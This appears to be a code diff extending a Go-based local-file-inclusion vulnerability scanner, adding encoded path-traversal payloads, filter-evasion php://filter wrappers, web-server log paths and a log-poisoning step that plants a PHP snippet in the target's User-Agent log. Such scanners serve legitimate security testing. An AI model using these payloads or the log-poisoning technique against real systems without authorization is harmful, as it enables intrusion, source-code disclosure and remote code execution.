@@ -4,6 +4,8 @@ import (
 	"context"
 	"encoding/base64"
 	"fmt"
+	"io"
+	"mime/quotedprintable"
 	"net/http"
 	"regexp"
 	"strings"
@@ -65,11 +67,49 @@ var lfiPayloads = []string{
 	// non-destructive command used industry-wide as the standard LFI-to-RCE
 	// PoC (proves execution without altering anything on the target).
 	"expect://id",
+	// Double/percent-encoded traversal — bypasses a filter that decodes the
+	// input exactly once before checking for "../": a %25-prefixed second
+	// layer survives that single-pass check and is decoded again by the
+	// underlying web/app server.
+	"..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
+	"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+	// Path-segment normalization bypass — some reverse proxies/frameworks strip
+	// a literal "../" segment but pass a semicolon-terminated one through
+	// unmodified, which the app server then normalizes back to "..".
+	"..;/..;/..;/..;/..;/..;/etc/passwd",
+	"./../../../../../../../etc/passwd",
+	// Alternate read-encoding wrappers — some WAFs specifically block the
+	// literal string "base64" appearing in a query value; rot13 and
+	// quoted-printable achieve the same "reveal source instead of executing
+	// it" read primitive while evading a base64-keyword filter.
+	"php://filter/string.rot13/resource=index.php",
+	"php://filter/convert.quoted-printable-encode/resource=index.php",
+}
+
+// lfiLogPaths are common web-server log locations that, if included through a
+// vulnerable file parameter, execute attacker-controlled content planted by
+// an earlier ordinary request (log poisoning) — the standard LFI-to-RCE
+// technique for when direct wrappers (php://filter, data://, expect://) are
+// disabled or blocked. poisonRequestLogs plants the marker these look for.
+var lfiLogPaths = []string{
+	"/var/log/apache2/access.log",
+	"/var/log/apache2/error.log",
+	"/var/log/httpd/access_log",
+	"/var/log/httpd/error_log",
+	"/var/log/nginx/access.log",
+	"/var/log/nginx/error.log",
+	"../../../../../../../../var/log/apache2/access.log",
+	"../../../../../../../../var/log/nginx/access.log",
 }
 
 // lfiMarker uniquely tags the data:// PoC payload so its confirmation can
 // never collide with unrelated page content.
 const lfiMarker = "a1b2c3"
+
+// lfiLogPoisonMarker uniquely tags the log-poisoning PoC (see
+// poisonRequestLogs) so its confirmation can never collide with the data://
+// marker above or with unrelated page content.
+const lfiLogPoisonMarker = "d4e5f6"
 
 // Signatures that confirm file read (very low false-positive).
 var (
@@ -100,6 +140,14 @@ func (s *LFIScanner) Run(ctx context.Context, targetID string, logFn LogFunc) er
 		corpusDir = s.cfg.WordlistsDir
 	}
 	payloads := LoadCorpus(corpusDir, "lfi", lfiPayloads)
+	payloads = append(payloads, lfiLogPaths...)
+
+	// Plant the log-poisoning marker once, target-wide, before any candidate is
+	// tested — a single ordinary request whose User-Agent is logged verbatim by
+	// any standard access log. Harmless unless a vulnerable parameter later
+	// include()s that same log file, which is exactly what the payloads above
+	// (and confirmLFI's marker check) test for.
+	s.poisonRequestLogs(ctx, candidates[0].URL, auth)
 
 	sem := make(chan struct{}, 8)
 	var wg sync.WaitGroup
@@ -162,8 +210,66 @@ func (s *LFIScanner) Run(ctx context.Context, targetID string, logFn LogFunc) er
 	return nil
 }
 
+// poisonRequestLogs plants a harmless, uniquely-marked PHP echo in the target's
+// own access log via a single ordinary request's User-Agent header (every
+// standard web server logs it verbatim). If the target later include()s its
+// own log file through a vulnerable parameter, PHP executes the planted
+// snippet and the marker appears in the response — proof of LFI-to-RCE via
+// log poisoning, without writing, deleting, or altering anything the
+// application itself does not already log as a matter of course.
+func (s *LFIScanner) poisonRequestLogs(ctx context.Context, rawURL string, auth map[string]string) {
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
+	if err != nil {
+		return
+	}
+	req.Header.Set("User-Agent", "<?php echo 'rcnLFI_"+lfiLogPoisonMarker+"'; ?>")
+	for k, v := range auth {
+		req.Header.Set(k, v)
+	}
+	resp, err := lfiHTTPClient.Do(req)
+	if err != nil {
+		return
+	}
+	resp.Body.Close()
+}
+
+// rot13 is the reversible ROT13 substitution, used to decode the
+// php://filter/string.rot13 read-wrapper response for confirmation.
+func rot13(s string) string {
+	return strings.Map(func(r rune) rune {
+		switch {
+		case r >= 'a' && r <= 'z':
+			return 'a' + (r-'a'+13)%26
+		case r >= 'A' && r <= 'Z':
+			return 'A' + (r-'A'+13)%26
+		}
+		return r
+	}, s)
+}
+
 // confirmLFI validates a response actually contains file contents.
 func confirmLFI(payload, body string) string {
+	// Log poisoning: our own marker executing means the target include()d a
+	// log file that itself logged our planted User-Agent as PHP source. Check
+	// this before anything else — it is independent of which log-path payload
+	// was actually sent (log rotation/aliasing can make a slightly different
+	// path than the one poisoned still resolve to the same underlying file).
+	if strings.Contains(body, "rcnLFI_"+lfiLogPoisonMarker) {
+		return "log poisoning code execution"
+	}
+	if strings.Contains(payload, "string.rot13") {
+		if d := rot13(body); strings.Contains(d, "<?php") || strings.Contains(d, "root:") {
+			return "php://filter rot13 source disclosure"
+		}
+	}
+	if strings.Contains(payload, "convert.quoted-printable-encode") {
+		if dec, err := io.ReadAll(quotedprintable.NewReader(strings.NewReader(body))); err == nil {
+			d := string(dec)
+			if strings.Contains(d, "<?php") || strings.Contains(d, "root:") {
+				return "php://filter quoted-printable source disclosure"
+			}
+		}
+	}
 	if reEtcPasswd.MatchString(body) || reDaemon.MatchString(body) {
 		return "/etc/passwd"
 	}
